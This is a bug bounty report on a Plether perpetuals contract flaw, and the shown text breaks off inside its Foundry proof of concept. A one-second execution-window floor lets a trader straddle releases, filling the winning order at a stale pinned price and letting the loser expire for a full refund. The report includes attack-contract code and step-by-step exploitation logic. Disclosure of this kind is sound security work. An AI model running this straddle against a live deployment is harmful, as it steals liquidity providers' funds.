# \#99136 [SC-Critical] Missing minimum execution window in the OrderRouter commit check turns every pinned order into a free option and leads to direct theft of LP funds

**Submitted on Nov 12th 2026 at 01:51:17 UTC by @deltabear for [Audit Competition | Plether](https://immunefi.com/audit-competition/plether)**

- **Report ID:** #99136
- **Report Type:** Smart Contract
- **Report severity:** Critical
- **Target:** https://github.com/immunefi-team/audit-comp-plether/tree/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src
- **Impacts:**
  - Direct theft of any user funds, whether at-rest or in-motion, other than unclaimed yield

## Description

## Brief/Intro

An order fills at the first Pyth update after its commit, but the trader picks the order's deadline, and the only floor is one second. Past the deadline the order is `Expired` and its whole margin goes back to the trader. The deployment's executor reaches an order 4 to 7 seconds after its commit, so an order with a 2 or 3 second window is filled by its owner or by nobody. The owner reads the move after the pinned update, fills the order at the old price when the move is in its favour, and lets it lapse for free when it is not. I commit a LONG and a SHORT at the largest size the protocol allows, fill the winner at the stale price and let the loser expire. Over six 30 bps releases the attacker withdraws 50,065.40 USDG more than it put in, and the victim LP's Junior is worth 59,632.68 USDG less than with no attacker.

## Vulnerability Details

1. `Router.commitOrder` checks the trader's `executionWindowSeconds` only against zero and the 60 s maximum (`router/OrderLiquidationBatchLogic.sol:287-289`, default maximum at `router/OrderExecutionOrchestrator.sol:11,14`). There is no minimum tied to keeper latency or to the 15 s `orderSettlementWindow` (`PletherOracle.sol:87`). The floor is a hardcoded `== 0` check, and the admin setter bounds only the maximum (`OrderRouterAdmin.sol:338-343`), so no setting raises it.
2. The lifecycle Book stores `executionDeadline = commitTimestamp + executionWindowSeconds` once (`OrderLifecycleBook.sol:287-295`, documented at `SECURITY.md:783-786`).
3. The fill price is the first update with `publishTime >= commitTime + 1`, whoever executes (`PletherOracle.sol:610-614`). The price is fixed and public one second after the commit.
4. `Router.executeOrder` has no caller restriction (`OrderRouter.sol:240-243`), so the owner's own account executes its order. On the way to its target id, `executeOrder` finalizes every head that is terminal before oracle work, expired heads included (`OrderRouterExecutionSidecar.sol:147-192`).
5. Once `block.timestamp > executionDeadline` the order is classified `Expire` before any oracle work (`OrderRouterExecutionSidecar.sol:910-912`) and settled with `TerminalReason.Expired` (`OrderRouterExecutionSidecar.sol:388-394`). Anyone calls `Router.expireOrder` after the deadline (`OrderRouter.sol:191-196`, `OrderRecoverySidecar.sol:49-64`). Settlement releases the whole committed margin (`OrderRouter.sol:303`) and returns the bounty to the account when the account is the executor (`OrderRouter.sol:336-337`). A third-party cleaner gets the open bounty, at most 0.20 USDG.
6. The v2.0.0 deployment's executor reached the six consecutive orders 183 to 188 of 6 Nov 2026 after 4, 6, 7, 4, 5 and 6 seconds (all 269 v2.0.0 orders: median 5 s). A 2 s order and a 3 s order are both expired when it arrives.
7. The attacker runs two plain accounts. In one block it commits a SHORT and a LONG, leg 1 with a 2 s window and leg 2 with a 3 s window, both pinned to the same update. When the move favours leg 1, the owner executes leg 1 at commit + 2. When it favours leg 2, the owner executes leg 2 at commit + 3, and that one call finalizes the expired leg 1 (step 4). Every round the winner fills and the loser expires, whichever side wins and whichever leg comes first.
8. The guard that should stop this is the lifecycle rule at `SECURITY.md:658-659`: "binding order semantics and the lack of a user cancellation path prevent traders from turning queued intents into free options". A deadline the trader sets below keeper latency is a user cancellation path. Nothing compares the window to the time a keeper needs to reach the order.

### Vulnerable source code

**1. The only window check at commit: zero, or above the maximum** @ packages/perps/src/router/OrderLiquidationBatchLogic.sol:287-289
```solidity
        if (bounds.executionWindowSeconds == 0 || bounds.executionWindowSeconds > host.maxExecutionWindowSeconds()) {
            revert OrderRouter__InvalidExecutionWindow();
        }
```

**2. The deadline is the commit time plus the trader's window** @ packages/perps/src/OrderLifecycleBook.sol:287-295
```solidity
        uint256 deadline = block.timestamp + uint256(request.bounds.executionWindowSeconds);
        if (block.timestamp > type(uint64).max || deadline > type(uint64).max) {
            revert OrderLifecycleBook__TerminalClockOverflow();
        }
        OrderV3Types.OrderTiming memory timing = OrderV3Types.OrderTiming({
            submitBy: request.bounds.submitBy,
            executionWindowSeconds: request.bounds.executionWindowSeconds,
            commitTimestamp: uint64(block.timestamp),
            executionDeadline: uint64(deadline)
```

**3. The fill is pinned to the first update after the commit** @ packages/perps/src/PletherOracle.sol:610-614
```solidity
        uint64 minPublishTime = request.commitTime + 1;
        uint256 settlementDeadline = uint256(request.commitTime) + orderSettlementWindow;
        uint64 maxPublishTime = uint64(settlementDeadline < block.timestamp ? settlementDeadline : block.timestamp);
        try pyth.parsePriceFeedUpdatesUnique{value: pythFee}(
            pythUpdateData, pythFeedIds, minPublishTime, maxPublishTime
```

**4. Past the deadline the order expires before any oracle work** @ packages/perps/src/OrderRouterExecutionSidecar.sol:910-912
```solidity
        if (block.timestamp > pending.timing.executionDeadline) {
            return (IOrderRouterExecutionHost.ItemAction.Expire, true);
        }
```

**5. The expired order is settled as `Expired`** @ packages/perps/src/OrderRouterExecutionSidecar.sol:388-394
```solidity
        if (block.timestamp > pending.timing.executionDeadline) {
            return _settleNonEngine(
                request,
                OrderV3Types.TerminalReason.Expired,
                OrderV3Types.FailureDetails(bytes4(0), 0, 0, OrderV3Types.ConstraintKind.None, 0, 0, bytes32(0))
            );
        }
```

**6. Anyone finalizes an order once its deadline passes** @ packages/perps/src/OrderRecoverySidecar.sol:57-63
```solidity
        if (block.timestamp <= pending.timing.executionDeadline) {
            revert OrderRouter__OrderNotExpired();
        }
        IOrderRouterExecutionHost.ItemRequest memory request = _cleanupRequest(
            host, orderId, true, IOrderLifecycleBook(host.lifecycleBook()).currentExecutionConfigHash()
        );
        return host.executeOrderItemFromSidecar(request);
```

**7. The whole committed margin is released** @ packages/perps/src/OrderRouter.sol:302-303
```solidity
        (, CfdTypes.Order memory order) = _pendingOrder(orderId);
        clearinghouse.releaseOrderReservationForTerminalCleanup(orderId);
```

**8. The bounty goes back when the owner's account is the executor** @ packages/perps/src/OrderRouter.sol:336-337
```solidity
            if (bountyRecipient == order.account) {
                clearinghouse.releaseReservedExecutionBountyToSource(order.account, bountyAssets);
```

## Impact Details

- Impact row: **"Direct theft of any user funds, whether at-rest or in-motion, other than unclaimed yield"** (Critical). Over six 30 bps releases the attacker's wallet goes from 800,000.000000 to 850,065.401618 USDG, +50,065.401618 USDG. The victim LP_J's Junior is worth 9,940,367.323914 USDG against 9,999,999.999943 USDG with no attacker, -59,632.676029 USDG, and `HousePool.totalAssets` ends 59,632.681698 USDG lower. Each round the pool pays the winner's PnL out of LP capital (`HousePool::payOut` of 11,588.40 USDG in round 1).
- One release the size of the 6 Nov 2026 payrolls move (-13.04 bp, the deployment's own pinned mark 96,318,319 to its next mark 96,192,674) pays the attacker +1,592.724089 USDG and costs the LP 3,191.043866 USDG.
- Every round wins, in both directions and in both leg orders: +8,386.52, +8,335.18, +8,369.72, +8,318.49, +8,310.54 and +8,344.95 USDG. No losing leg fills; each ends `status: 3, terminalReason: 2` (`Expired`).
- The same binding orders, filled by the executor at the pinned price, lose 139,550.07 USDG. The free cancel is the whole difference.
- Size is the protocol's own maximum from `CfdEngineLens.quoteMaxOpen`, bound by the 40% skew cap: 3,976,100 to 3,996,000 USDG per leg on a 10,000,000 USDG pool. The take per release grows with pool depth.
- Prerequisites, all permissionless: 800,000 USDG of trading capital in two contract accounts, and the public calls `commitOrder`, `executeOrder` and `withdrawMargin`. No LP position, no keeper or owner role, no special pool state.
- The victim never sees a cancellation. The loser ends with the same `Expired` receipt as any order that timed out. There is no pool-depth change, no LP settlement and no liquidation.
- It repeats at every release and no setting closes it: the window is a field of every order request, and the floor is a hardcoded `== 0` check.
- Dedup. SC-M4 in the pre-audit report is a free-option attack, "Risk Free Option in 60Sec Oracle Window", marked "Fixed in Plether-Fi/plether-core#24." The program rule is: "For findings marked as fixed or Acknowledged in the reports above, a report on the same root cause is valid only if it shows that the fix at commit a82d4fefb02768e5b3bddcc97dee371eee24fea8 is incomplete or introduces a new bug." The run is at that commit. My confirmed report #97858 and my other reports in this family void the losing order with a state lever (`settleLpEpoch`, liquidation cleanup, `withdraw`, `addMargin`), and the order fails as `PlannerRejected` or `AccountLiquidated`. This report uses no lever: the trader's own deadline voids the order as `Expired`. The root is the one-second floor on `executionWindowSeconds` together with the full refund on expiry. The fix is a minimum window above keeper latency plus `orderSettlementWindow`, or letting anyone fill an expired order at its pinned update, or making expiry forfeit a fee. None of the other fixes touches this path.

## References

Window, deadline and pin
- packages/perps/src/router/OrderLiquidationBatchLogic.sol:287-289 - window checked only against 0 and the maximum
- packages/perps/src/router/OrderExecutionOrchestrator.sol:11,14 - default maximum 60 s
- packages/perps/src/OrderRouterAdmin.sol:338-343 - admin bound on the maximum only
- packages/perps/src/OrderLifecycleBook.sol:287-295 - deadline stored as commit time plus window
- packages/perps/src/PletherOracle.sol:87 - `orderSettlementWindow = 15`
- packages/perps/src/PletherOracle.sol:610-614 - fill pinned to the first update after the commit

Execution and expiry
- packages/perps/src/OrderRouter.sol:240-243 - `executeOrder`, any caller
- packages/perps/src/OrderRouterExecutionSidecar.sol:147-192 - expired heads finalized before the target executes
- packages/perps/src/OrderRouterExecutionSidecar.sol:910-912 - `Expire` before oracle work
- packages/perps/src/OrderRouterExecutionSidecar.sol:388-394 - settled as `TerminalReason.Expired`
- packages/perps/src/OrderRouter.sol:191-196 - `expireOrder`, any caller
- packages/perps/src/OrderRecoverySidecar.sol:49-64 - expiry allowed once the deadline passes
- packages/perps/src/OrderRouter.sol:303 - committed margin released
- packages/perps/src/OrderRouter.sol:336-337 - bounty back to the account when it executes

Guarantee and prior finding
- packages/perps/SECURITY.md:658-659 - "the lack of a user cancellation path prevent traders from turning queued intents into free options"
- packages/perps/SECURITY.md:783-786 - deadline mechanics
- audits/plether-pre-audit-report.pdf, SC-M4 - "Fixed in Plether-Fi/plether-core#24."

Deployment data
- gist `keeper-latency-v2.0.0-summary.txt` - commit-to-terminal latency of all 269 v2.0.0 orders, per day; orders 183 to 188: 4, 6, 7, 4, 5, 6 s

## Link to Proof of Concept

https://gist.github.com/decies-centena-millia/206645fe13831cd4e3e2320e6c1768be

## Proof of Concept

## Proof of Concept

One Foundry test file on the repo's own `BasePerpTest` with the `DEPLOYMENT.md` release parameters, asserted in `setUp`. Only USDG and Pyth are the repo's mocks. Every fill is an explicit Pyth update at commit + 1, every size comes from `CfdEngineLens.quoteMaxOpen`, the executor arrives at the deployment's measured latency, and every number is read back from the contracts.

All files and every raw output (`-vv`, one `-vvvv` trace per test, versions, SHA-256 sums) are in the secret gist: https://gist.github.com/decies-centena-millia/206645fe13831cd4e3e2320e6c1768be

```bash
git clone --recurse-submodules https://github.com/immunefi-team/audit-comp-plether.git && cd audit-comp-plether && git checkout --detach a82d4fefb02768e5b3bddcc97dee371eee24fea8 && git submodule update --init --recursive
mkdir -p packages/perps/test/poc_shortwindow && cp ShortWindowStraddlePoC.t.sol packages/perps/test/poc_shortwindow/ && cd packages/perps && forge test --match-path test/poc_shortwindow/ShortWindowStraddlePoC.t.sol -vv
```

### attack step-by-step

1. Monday 2024-10-14 10:00 UTC: victim LP_J holds 10,000,000 USDG of Junior. The attacker funds two `OptionAccount`s with 400,000 USDG each.
2. Each release, the attacker quotes the largest LONG and SHORT the lens allows (about 3,990,000 USDG each) and commits both in one block: leg 1 with a 2 s window, leg 2 with a 3 s window, 200,000 USDG of margin each. Both pin to the update at commit + 1.
3. The release moves 30 bps after the pinned update.
4. The owner executes the winning leg with the pinned update: at commit + 2 when it is leg 1, at commit + 3 when it is leg 2 (that call also finalizes the expired leg 1).
5. The executor reaches the losing leg at its measured latency (4 to 7 s) and finalizes it as `Expired`. Its margin goes back to the attacker.
6. The winner closes at the moved price. After six releases both accounts withdraw everything to the attacker's wallet.

## main Attack code

```solidity
// The attacker's account. Its only levers are the window on its own orders and executing them, or not.
contract OptionAccount {
    function commit(OrderV3Types.OrderRequest calldata request) external onlyOwner returns (uint64 orderId) {
        orderId = router.commitOrder(request);
    }

    function execute(uint64 id, bytes[] calldata pinned) external onlyOwner returns (OrderV3Types.ExecutionResult memory r) {
        r = router.executeOrder(id, pinned);
    }

    function withdrawAll() external onlyOwner {
        uint256 bal = clearinghouse.balanceAssets(address(this));
        if (bal != 0) clearinghouse.withdrawMargin(bal);
        uint256 w = usdg.balanceOf(address(this));
        if (w != 0) usdg.transfer(owner, w);
    }
}
```

```solidity
// one release: both legs at the lens maximum, 2 s and 3 s windows, one block
uint256 sizeL = _maxSize(acctL, CfdTypes.Side.LONG);
uint256 sizeS = _maxSize(acctS, CfdTypes.Side.SHORT);
legs[0].id = _commit(legs[0].acct, legs[0].side, legs[0].side == CfdTypes.Side.LONG ? sizeL : sizeS, MARGIN, false, legs[0].window);
legs[1].id = _commit(legs[1].acct, legs[1].side, legs[1].side == CfdTypes.Side.LONG ? sizeL : sizeS, MARGIN, false, legs[1].window);
uint256 c = _now();
_advance(1); // commit + 1: the pinned update prints at PX

for (uint256 i; i < 2; ++i) {
    _warpTo(c + legs[i].window);
    bool favourable = (legs[i].side == CfdTypes.Side.LONG) == down;
    if (favourable) {
        require(_executed(_ownerExec(legs[i].acct, legs[i].id, PX)), "favourable leg fills at the stale pin");
    }
}

_warpTo(c + latency); // the deployment's executor, at its measured latency for this round
for (uint256 i; i < 2; ++i) {
    if (_isPending(legs[i].id)) _keeperExec(legs[i].id, PX);
}
```

```
plant : commit a LONG and a SHORT at the lens maximum with 2 s and 3 s windows, pinned to the next update
fire  : executeOrder the winning leg with its pinned update; the loser expires and its margin comes back
```

### full poc code, single file, single runnable command

Foundry `forge 1.8.5` (commit `51a52c59`), `solc 0.8.35`, `via_ir = true`, `optimizer_runs = 200`, from the repo's own `packages/perps/foundry.toml`. The test runs on the repo's `test/perps/BasePerpTest.sol` fixture, which the program provides, so only this one file is added.

`ShortWindowStraddlePoC.t.sol`
```solidity
// SPDX-License-Identifier: AGPL-3.0
pragma solidity 0.8.35;

// PoC: a trader-chosen execution window shorter than keeper latency turns every pinned order into a zero-premium option.
//
// The fill price is pinned to the first Pyth update after commit (PletherOracle.sol:610-615, minPublishTime =
// commitTime + 1), execution is voluntary, and the deadline is chosen by the trader with a floor of ONE second
// (OrderLiquidationBatchLogic.sol:287-289 rejects only executionWindowSeconds == 0 || > maxExecutionWindowSeconds = 60;
// OrderLifecycleBook.sol:287-295 stores deadline = commitTimestamp + executionWindowSeconds). Past the deadline the order
// is terminal Expired before any oracle work (OrderRouterExecutionSidecar.sol:910-912, :388-394) and its whole committed
// margin is released (OrderRouter.sol:303); the open bounty returns to the owner's account when the owner's own account is
// the executor (OrderRouter.sol:336-337) or pays at most 0.20 USDG to a third-party cleaner.
// So with a window below keeper latency, no keeper can fill the order; the owner reads the move after the pinned update
// and either executes it at the stale pin (favourable) or lets it lapse for free (adverse). SECURITY.md:658-659: "binding
// order semantics and the lack of a user cancellation path prevent traders from turning queued intents into free options".
//
// Repo's own Foundry suite at a82d4fef on BasePerpTest with the DEPLOYMENT.md release parameters (asserted in setUp).
// Only USDG (MockSettlementToken) and Pyth (MockPyth) are the repo's mocks, as the program permits; every in-scope contract
// is the real one. Same Pyth model as the confirmed sibling PoCs: two feeds, 2 bps confidence, explicit FeedUpdate[] at
// commit + 1 so no executor can choose the price. Keeper latency: the real v2.0.0 executor's measured commit-to-terminal
// latency (all 269 v2.0.0 orders, deployment events; per round, the six consecutive real orders 183-188 of 6 Nov 2026).
// Order size: the largest open the protocol's own CfdEngineLens.quoteMaxOpen allows at that moment.
//
// Run (from packages/perps, file in test/poc_shortwindow/):
//   forge test --match-path 'test/poc_shortwindow/ShortWindowStraddlePoC.t.sol' -vv      (add -vvvv for the raw trace)

import {BasePerpTest} from "../perps/BasePerpTest.sol";
import {CfdTypes} from "@plether/perps/CfdTypes.sol";
import {OrderV3Types} from "@plether/perps/OrderV3Types.sol";
import {ICfdEngineLens} from "@plether/perps/interfaces/ICfdEngineLens.sol";
import {IHousePool} from "@plether/perps/interfaces/IHousePool.sol";
import {IOrderRouterAdminHost} from "@plether/perps/interfaces/IOrderRouterAdminHost.sol";
import {IOrderRouterAccounting} from "@plether/perps/interfaces/IOrderRouterAccounting.sol";
import {MockPyth} from "@plether/test-utils/MockPyth.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {console2} from "forge-std/console2.sol";

// ======================================================================= base (release config + helpers)

abstract contract ShortWindowBase is BasePerpTest {
    uint256 internal constant PX = 1e8; // 1.00 index, 8-decimal price units
    uint64 internal constant CONF = 2e4; // 2 bps confidence on each feed (release adverse-confidence shift applies)

    address internal constant ATTACKER = address(0xA11CE);
    address internal constant KEEPER = address(0x4B33);
    address internal constant THIRD = address(0xC1EA11); // an unrelated cleaner
    address internal constant LP_J = address(0x1117);

    uint256 internal constant WEEK_MON_10UTC = 1_728_900_000;

    // Trader-chosen windows. The code floor is 1 s. Leg 1 of a straddle uses 2 s, leg 2 uses 3 s, so leg 1 is already
    // expired (prunable) when leg 2 is decided under the global FIFO.
    uint32 internal constant W1 = 2;
    uint32 internal constant W2 = 3;

    // DEPLOYMENT.md release parameters (identical to the confirmed #97858 / liquidation-cleanup PoCs).
    function _riskParams() internal pure virtual override returns (CfdTypes.RiskParams memory) {
        return CfdTypes.RiskParams({
            vpiFactor: 0.01e18,
            maxSkewRatio: 0.4e18,
            maintMarginBps: 10,
            initMarginBps: 20,
            fadMarginBps: 300,
            baseCarryBps: 500,
            minBountyAssets: 1e6,
            bountyBps: 10,
            keeperShareBps: 5000,
            protocolShareBps: 0
        });
    }

    function _initialJuniorDeposit() internal pure virtual override returns (uint256) {
        return 0;
    }

    function _initialSeniorDeposit() internal pure virtual override returns (uint256) {
        return 0;
    }

    function _initialJuniorSeedDeposit() internal pure virtual override returns (uint256) {
        return 1e6;
    }

    function _initialSeniorSeedDeposit() internal pure virtual override returns (uint256) {
        return 1e6;
    }

    function setUp() public virtual override {
        super.setUp();
        uint256 start = vm.getBlockTimestamp();
        IHousePool.PoolConfig memory poolConfig = _currentPoolConfig();
        poolConfig.maxSeniorExposureAssets = 40_000_000e6;
        poolConfig.maxSeniorShareBps = 8000;
        pool.proposePoolConfig(poolConfig);
        vm.warp(pool.poolConfigActivationTime());
        pool.finalizePoolConfig();
        IOrderRouterAdminHost.RouterConfig memory routerConfig = _routerConfig();
        routerConfig.adverseConfidenceMultiplierBps = 2500;
        routerConfig.minOpenNotionalAssets = 1000e6;
        _setRouterConfig(routerConfig);
        vm.warp(start);
        vm.roll(vm.getBlockNumber() + 1);
        _assertReleaseConfig();
    }

    // Assert the live config equals DEPLOYMENT.md (production-faithful), so the fixture cannot silently drift.
    function _assertReleaseConfig() internal view {
        (
            uint256 vpiFactor,
            uint256 maxSkewRatio,
            uint256 maintMarginBps,
            uint256 initMarginBps,
            uint256 fadMarginBps,
            uint256 baseCarryBps,
            uint256 minBountyAssets,
            uint256 bountyBps,
            uint256 keeperShareBps,
            uint256 protocolShareBps
        ) = engine.riskParams();
        assertEq(vpiFactor, 0.01e18, "vpiFactor");
        assertEq(maxSkewRatio, 0.4e18, "maxSkewRatio");
        assertEq(maintMarginBps, 10, "maintMarginBps");
        assertEq(initMarginBps, 20, "initMarginBps");
        assertEq(fadMarginBps, 300, "fadMarginBps");
        assertEq(baseCarryBps, 500, "baseCarryBps");
        assertEq(minBountyAssets, 1e6, "minBountyAssets");
        assertEq(bountyBps, 10, "bountyBps");
        assertEq(keeperShareBps, 5000, "keeperShareBps");
        assertEq(protocolShareBps, 0, "protocolShareBps");
        assertEq(engine.executionFeeBps(), 4, "executionFeeBps");
        assertEq(engine.settlementBufferBps(), 25, "settlementBufferBps");
        assertEq(router.minOpenNotionalAssets(), 1000e6, "minOpenNotionalAssets");
        assertEq(router.maxExecutionWindowSeconds(), 60, "maxExecutionWindowSeconds");
        assertEq(pool.maxSeniorExposureAssets(), 40_000_000e6, "maxSeniorExposureAssets");
        assertEq(pool.maxSeniorShareBps(), 8000, "maxSeniorShareBps");
        assertFalse(engine.isFadWindow(), "live market, not FAD");
        assertFalse(engine.isOracleFrozen(), "live market, not frozen");
    }

    function _now() internal view returns (uint256) {
        return vm.getBlockTimestamp();
    }

    function _advance(uint256 s) internal {
        vm.warp(vm.getBlockTimestamp() + s);
        vm.roll(vm.getBlockNumber() + 1);
    }

    function _warpTo(uint256 ts) internal {
        vm.warp(ts);
        vm.roll(vm.getBlockNumber() + 1);
    }

    // Explicit FeedUpdate[] -> the fill price is fixed by data, never chosen by the executor.
    function _tick(uint256 price, uint256 t) internal pure returns (bytes[] memory updateData) {
        int64 p = int64(uint64(price));
        MockPyth.FeedUpdate[] memory updates = new MockPyth.FeedUpdate[](2);
        updates[0] = MockPyth.FeedUpdate({id: BASE_PYTH_FEED_A, price: MockPyth.MockPrice(p, CONF, int32(-8), t, t - 1)});
        updates[1] = MockPyth.FeedUpdate({id: BASE_PYTH_FEED_B, price: MockPyth.MockPrice(p, CONF, int32(-8), t, t - 1)});
        updateData = new bytes[](1);
        updateData[0] = abi.encode(updates);
    }

    function _request(CfdTypes.Side side, uint256 size, uint256 margin, bool isClose, uint32 window, uint256 nonce)
        internal
        view
        returns (OrderV3Types.OrderRequest memory request)
    {
        request.clientOrderId = keccak256(abi.encode("shortwindow-straddle", nonce));
        request.side = side;
        request.sizeDelta = size;
        request.marginDelta = margin;
        request.targetPrice = (side == CfdTypes.Side.LONG) == isClose ? type(uint256).max : 1;
        request.isClose = isClose;
        request.bounds = OrderV3Types.ExecutionBounds({
            submitBy: uint64(_now()) + uint64(router.maxExecutionWindowSeconds()),
            executionWindowSeconds: window, // <= the whole lever: a trader-chosen window below keeper latency
            allowedExecutionModes: 7,
            expectedConfigHash: router.lifecycleBook().currentExecutionConfigHash(),
            maxExecutionBountyAssets: type(uint256).max,
            maxExecutionNotionalAssets: type(uint256).max,
            maxGrossAccountDebitAssets: type(uint256).max,
            maxActionChargeAssets: type(uint256).max,
            maxExplicitFeesAssets: type(uint256).max,
            maxPostPositionSize: type(uint256).max,
            minPostSettlementBalanceAssets: 0,
            minPostPositionEquityAssets: 0,
            maxPostLeverageBps: type(uint32).max
        });
    }

    function _commitTime(uint64 id) internal view returns (uint256) {
        (IOrderRouterAccounting.PendingOrderView memory v,) = router.getPendingOrderView(id);
        return uint256(v.commitTime);
    }

    function _deadline(uint64 id) internal view returns (uint256) {
        return uint256(router.lifecycleBook().pendingIntent(id).timing.executionDeadline);
    }

    function _pending(uint64 id) internal view returns (IOrderRouterAccounting.PendingOrderView memory v) {
        (v,) = router.getPendingOrderView(id);
    }

    function _isPending(uint64 id) internal view returns (bool) {
        return router.lifecycleBook().pendingIntent(id).account != address(0);
    }

    function _live(uint256 price) internal {
        bytes[] memory d = _tick(price, _now());
        vm.prank(KEEPER);
        router.updateMarkPrice(d);
    }

    function _executed(OrderV3Types.ExecutionResult memory r) internal pure returns (bool) {
        return r.terminalReason == OrderV3Types.TerminalReason.Executed;
    }

    function _sizeOf(address account) internal view returns (uint256 size) {
        (size,,,,,,) = engine.positions(account);
    }

    function _reason(uint64 id) internal view returns (OrderV3Types.TerminalReason) {
        return router.lifecycleBook().terminalOutcome(id).reason;
    }

    function _status(uint64 id) internal view returns (OrderV3Types.LifecycleStatus) {
        return router.lifecycleBook().terminalOutcome(id).status;
    }

    function _usd(uint256 atoms) internal pure returns (string memory) {
        bytes memory f = bytes(vm.toString(atoms % 1e6 + 1e6));
        bytes memory frac = new bytes(6);
        for (uint256 i; i < 6; ++i) frac[i] = f[i + 1];
        return string.concat(vm.toString(atoms / 1e6), ".", string(frac));
    }

    function _usdSigned(int256 atoms) internal pure returns (string memory) {
        return atoms < 0 ? string.concat("-", _usd(uint256(-atoms))) : string.concat("+", _usd(uint256(atoms)));
    }
}

// ======================================================================= attacker account

interface IAcctRouter {
    function commitOrder(OrderV3Types.OrderRequest calldata request) external returns (uint64 orderId);
    function executeOrder(uint64 orderId, bytes[] calldata pythUpdateData)
        external
        payable
        returns (OrderV3Types.ExecutionResult memory result);
    function expireOrder(uint64 orderId) external returns (OrderV3Types.ExecutionResult memory result);
}

interface IAcctClearinghouse {
    function depositMargin(uint256 amount) external;
    function withdrawMargin(uint256 amount) external;
    function balanceAssets(address account) external view returns (uint256);
}

/// @notice An ordinary contract trading account. Its ONLY levers: the trader-chosen short execution window on its own
///         orders, and executing them (favourable) or not (adverse). It never touches pool depth, never settles LP
///         epochs, never liquidates anything, never adds margin.
contract OptionAccount {
    address internal immutable owner;
    IAcctRouter internal immutable router;
    IAcctClearinghouse internal immutable clearinghouse;
    IERC20 internal immutable usdg;

    constructor(address router_, address clearinghouse_, address usdg_) {
        owner = msg.sender;
        router = IAcctRouter(router_);
        clearinghouse = IAcctClearinghouse(clearinghouse_);
        usdg = IERC20(usdg_);
    }

    modifier onlyOwner() {
        require(msg.sender == owner, "owner");
        _;
    }

    function fund(uint256 amount) external onlyOwner {
        usdg.transferFrom(owner, address(this), amount);
        usdg.approve(address(clearinghouse), amount);
        clearinghouse.depositMargin(amount);
    }

    function commit(OrderV3Types.OrderRequest calldata request) external onlyOwner returns (uint64 orderId) {
        orderId = router.commitOrder(request);
    }

    /// @dev Exercise: execute the own order with its pinned update. Also prunes an earlier, already-lapsed FIFO head.
    function execute(uint64 id, bytes[] calldata pinned) external onlyOwner returns (OrderV3Types.ExecutionResult memory r) {
        r = router.executeOrder(id, pinned);
    }

    function expire(uint64 id) external onlyOwner returns (OrderV3Types.ExecutionResult memory r) {
        r = router.expireOrder(id);
    }

    function withdrawAll() external onlyOwner {
        uint256 bal = clearinghouse.balanceAssets(address(this));
        if (bal != 0) clearinghouse.withdrawMargin(bal);
        uint256 w = usdg.balanceOf(address(this));
        if (w != 0) usdg.transfer(owner, w);
    }
}

// ======================================================================= the PoC

contract ShortWindowStraddlePoC is ShortWindowBase {
    uint256 internal constant DEPTH = 10_000_000e6; // victim LP_J Junior (as in the confirmed sibling PoCs)
    uint256 internal constant MARGIN = 200_000e6; // per leg
    uint256 internal constant FUND = 400_000e6; // per account (two accounts: 800,000 USDG attacker capital)

    // Release-move path and size of the confirmed Critical #97858 PoC: six rounds of 30 bps, up/down/up/down/down/up.
    uint256 internal constant ROUNDS = 6;
    uint256 internal constant MOVE_BP = 30;

    // Real v2.0.0 executor latency (commit block to terminal block, seconds) of the six consecutive real orders
    // 183..188 committed on Fri 6 Nov 2026 12:51-13:53 UTC (provenance/keeper-latency-v2.0.0-summary.txt):
    // 4, 6, 7, 4, 5, 6. All-269-order distribution: median 5 s, p25 3 s, min 1 s.
    function _keeperLatency(uint256 k) internal pure returns (uint256) {
        uint8[6] memory l = [4, 6, 7, 4, 5, 6];
        return l[k % 6];
    }

    // Real 6-Nov NFP basket move, pinned 13:30:00 update -> next real update 13:30:35 (deployment's own marks):
    // 96,318,319 -> 96,192,674 (-13.04 bp); the release was readable on public trades by +1.3 s (-5.4 bp).
    uint256 internal constant NFP_PIN_MARK = 96_318_319;
    uint256 internal constant NFP_NEXT_MARK = 96_192_674;

    enum Mode {
        Attack,
        Honest,
        Baseline
    }

    struct Leg {
        OptionAccount acct;
        CfdTypes.Side side;
        uint64 id;
        uint32 window;
    }

    struct Outcome {
        uint256 attackerWallet;
        uint256 victimValue;
        uint256 poolAssets;
        int256[ROUNDS] roundPnl;
        uint256[ROUNDS] notional;
        uint256 lapses; // Expired free cancels
        uint256 fills; // stale-pin fills
    }

    OptionAccount internal acctL;
    OptionAccount internal acctS;
    uint256 internal nonce;

    function _commit(OptionAccount acct, CfdTypes.Side side, uint256 size, uint256 margin, bool isClose, uint32 window)
        internal
        returns (uint64 id)
    {
        OrderV3Types.OrderRequest memory req = _request(side, size, margin, isClose, window, ++nonce);
        vm.prank(ATTACKER);
        id = acct.commit(req);
    }

    function _keeperExec(uint64 id, uint256 price) internal returns (OrderV3Types.ExecutionResult memory r) {
        bytes[] memory d = _tick(price, _commitTime(id) + 1);
        vm.prank(KEEPER);
        r = router.executeOrder(id, d);
    }

    function _ownerExec(OptionAccount acct, uint64 id, uint256 price) internal returns (OrderV3Types.ExecutionResult memory r) {
        bytes[] memory d = _tick(price, _commitTime(id) + 1);
        vm.prank(ATTACKER);
        r = acct.execute(id, d);
    }

    /// @dev The largest open the protocol's own lens allows, quoted 10 bp above the price so the skew cap still holds at
    ///      the confidence-shifted execution price.
    function _maxSize(OptionAccount acct, CfdTypes.Side side) internal view returns (uint256 size) {
        ICfdEngineLens.MaxOpenQuote memory q = engineLens.quoteMaxOpen(address(acct), side, MARGIN, (PX * 10_010) / 10_000);
        size = (q.maxSizeDelta / CfdTypes.SIZE_QUANTUM) * CfdTypes.SIZE_QUANTUM;
        if (size == 0) {
            console2.log("lens zero capacity: limitingReason / side / free", uint256(q.limitingReason), uint256(side), clearinghouse.balanceAssets(address(acct)));
        }
        require(size != 0, "lens: no capacity");
    }

    // ---- setup

    function _newAccount() internal returns (OptionAccount acct) {
        settlementToken.mint(ATTACKER, FUND);
        vm.prank(ATTACKER);
        acct = new OptionAccount(address(router), address(clearinghouse), address(settlementToken));
        vm.prank(ATTACKER);
        settlementToken.approve(address(acct), FUND);
        vm.prank(ATTACKER);
        acct.fund(FUND);
    }

    function _setup() internal {
        _warpTo(WEEK_MON_10UTC);
        _fundJunior(LP_J, DEPTH);
        _advance(5);
        _live(PX);
        acctL = _newAccount();
        acctS = _newAccount();
    }

    function _accountBalances() internal view returns (uint256) {
        return clearinghouse.balanceAssets(address(acctL)) + clearinghouse.balanceAssets(address(acctS));
    }

    // ---- one straddle round. `down` = the basket price falls after the pinned update (LONG wins, SHORT loses).

    function _round(uint256 k, Mode mode, bool down, uint256 moveBp, uint256 latency)
        internal
        returns (int256 pnl, uint256 notional)
    {
